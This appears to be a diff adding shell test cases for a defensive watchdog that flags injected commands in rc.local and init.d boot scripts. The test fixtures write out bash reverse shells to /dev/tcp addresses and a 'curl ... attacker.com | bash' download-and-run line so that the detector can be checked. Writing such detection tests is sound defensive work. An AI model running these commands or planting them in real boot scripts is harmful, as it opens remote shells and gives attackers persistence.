@@ -188,3 +188,68 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-boot-script -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): boot-script-watchdog does NOT refresh baseline on injection-pattern detection — alert STAYS until operator updates" {
+    # T1037 boot-time persistence — injection alert MUST persist
+    # across runs until operator explicitly re-baselines.
+    seed_benign
+    run_wd
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${RCFILE}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"boot_script_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
+    # rc.local is /bin/sh; # comments. Operator notes about
+    # hypothetical attack patterns must NOT trigger alert.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\n# rc.local\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nexit 0\n' > "${RCFILE}"
+    run_wd
+    ! cap | grep -q '"event":"boot_script_suspicious"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-file scan: rc.local + /etc/init.d + rc?.d symlink-farm — injection in init.d script → alert)" {
+    # SysV boot has 3 surfaces — rc.local + init.d + rc?.d symlinks.
+    # Lock that the watchdog scans /etc/init.d when configured.
+    INITD2="${TMP}/init.d"; mkdir -p "${INITD2}"
+    seed_benign
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_MODULE_LIB="${LIB}" \
+    SELFDEF_BOOTSCRIPT_PROFILE="${PROFILE:-report}" \
+    SELFDEF_BOOTSCRIPT_BASELINE="${BASELINE}" \
+    SELFDEF_BOOTSCRIPT_RCLOCAL="${RCFILE}" \
+    SELFDEF_BOOTSCRIPT_INITD="${INITD2}" \
+    SELFDEF_BOOTSCRIPT_RCDIRS="${TMP}/no-rcdir" \
+    bash "${WD}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    # Plant injection in init.d script.
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${INITD2}/evil-service"
+    chmod 0755 "${INITD2}/evil-service"
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_MODULE_LIB="${LIB}" \
+    SELFDEF_BOOTSCRIPT_PROFILE="report" \
+    SELFDEF_BOOTSCRIPT_BASELINE="${BASELINE}" \
+    SELFDEF_BOOTSCRIPT_RCLOCAL="${RCFILE}" \
+    SELFDEF_BOOTSCRIPT_INITD="${INITD2}" \
+    SELFDEF_BOOTSCRIPT_RCDIRS="${TMP}/no-rcdir" \
+    bash "${WD}"
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    # curl | bash is a common bootstrap variant. Lock detection of
+    # the bash suffix in addition to sh.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${RCFILE}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
